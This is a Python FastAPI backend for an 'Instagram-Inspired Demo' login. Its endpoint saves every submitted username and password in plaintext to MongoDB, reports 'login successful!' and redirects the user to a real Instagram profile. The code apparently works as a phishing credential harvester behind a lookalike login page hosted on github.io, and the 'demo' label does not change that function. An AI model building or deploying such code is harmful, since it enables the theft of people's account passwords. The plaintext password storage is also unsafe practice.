import os
from datetime import datetime, timezone
from contextlib import asynccontextmanager

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from pymongo import AsyncMongoClient

load_dotenv()

MONGODB_URI = os.getenv("MONGODB_URI", "").strip()
MONGODB_DB = os.getenv("MONGODB_DB", "instastyle_demo")
MONGODB_COLLECTION = os.getenv("MONGODB_COLLECTION", "demo_usernames")

client = None
db = None


@asynccontextmanager
async def lifespan(app: FastAPI):
    global client, db

    if not MONGODB_URI:
        raise RuntimeError("Set MONGODB_URI in your .env file")

    client_kwargs = {
        "serverSelectionTimeoutMS": 3000,
        # === SERVERLESS OVERRIDES (Prevents Database Freezing) ===
        "maxPoolSize": 4,        
        "minPoolSize": 1,        
        "connect": False         
    }
    
    try:
        import certifi
        client_kwargs["tlsCAFile"] = certifi.where()
    except Exception:
        pass

    client = AsyncMongoClient(MONGODB_URI, **client_kwargs)
    db = client[MONGODB_DB]
    yield
    await client.close()


app = FastAPI(
    title="Instagram-Inspired Demo",
    lifespan=lifespan
)

# ==================== CORRECTED CORS LAYER ====================

from fastapi.middleware.cors import CORSMiddleware

origins = [
    "https://25am038-oss.github.io",
    "http://127.0.0.1:5500",
    "http://localhost:5500",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=False,
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization", "Accept"],
)

# ================================================================


class DemoLogin(BaseModel):
    username: str = Field(min_length=1, max_length=100)
    password: str = Field(min_length=1, max_length=100)


@app.get("/health")
async def health():
    try:
        await client.admin.command("ping")
        return {"status": "ok", "database": "connected"}
    except Exception as e:
        raise HTTPException(
            status_code=503,
            detail=f"Database unavailable: {str(e)}"
        )


@app.post("/api/demo-login")
async def demo_login(data: DemoLogin):
    username = data.username.strip()
    password = data.password.strip()

    if not username or not password:
        raise HTTPException(400, "Enter a demo username and password")

    try:
        collection = db[MONGODB_COLLECTION]
        result = await collection.insert_one({
            "username": username,
            "password": password,
            "demo": True,
            "status": "demo_login_success",
            "created_at": datetime.now(timezone.utc),
        })

        return {
            "success": True,
            "message": "login successful!",
            "id": str(result.inserted_id),
            "redirect_url": "https://www.instagram.com/s._darsanx._13?utm_source=ig_web_button_share_sheet&psln=ZDNlZDc0MzIxNw=="
        }
    except Exception as e:
        raise HTTPException(
            status_code=503,
            detail=f"Database write failed: {str(e)}. Please verify MongoDB Atlas Network Access whitelist."
        )
